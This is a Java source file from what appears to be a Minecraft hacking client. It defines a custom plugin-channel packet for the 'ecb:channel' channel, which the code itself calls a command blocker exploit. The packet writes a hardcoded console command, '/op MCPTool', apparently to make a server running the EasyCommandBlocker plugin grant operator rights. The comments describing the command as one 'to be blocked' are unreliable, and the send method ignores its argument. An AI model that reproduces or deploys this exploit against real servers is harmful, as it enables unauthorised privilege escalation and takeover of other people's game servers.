package dev.wrrulos.mcpclient.payloads;

import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.codec.PacketCodec;
import net.minecraft.network.packet.CustomPayload;
import net.minecraft.util.Identifier;

import java.util.Objects;

/**
 * A custom payload packet used to send a command blocker exploit through a plugin channel.
 */
public record EasyCommandBlockerPayloadPacket() implements CustomPayload {
    // The ID of the custom payload packet.
    public static final Id<EasyCommandBlockerPayloadPacket> ID = new Id<>(Identifier.of("ecb", "channel"));
    // The codec for the custom payload packet.
    public static final PacketCodec<PacketByteBuf, EasyCommandBlockerPayloadPacket> CODEC = CustomPayload.codecOf(EasyCommandBlockerPayloadPacket::write, EasyCommandBlockerPayloadPacket::new);

    /**
     * Constructs a new EasyCommandBlockerPayloadPacket.
     */
    private EasyCommandBlockerPayloadPacket(PacketByteBuf buf) {
        this();
    }

    // Sends the custom payload packet to the server.
    public static void send(String command) {
        Objects.requireNonNull(MinecraftClient.getInstance().getNetworkHandler()).sendPacket(new CustomPayloadC2SPacket(new EasyCommandBlockerPayloadPacket()));
    }

    /**
     * Writes the custom payload packet to the buffer, including the command to be blocked.
     *
     * @param buf The buffer to write to.
     */
    private void write(PacketByteBuf buf) {
        String command = "/op MCPTool";
        buf.writeString("ActionsSubChannel");
        buf.writeString("console_command: " + command);
    }

    /**
     * Gets the ID of the custom payload packet.
     *
     * @return The ID of the custom payload packet.
     */
    public Id<EasyCommandBlockerPayloadPacket> getId() {
        return ID;
    }
}
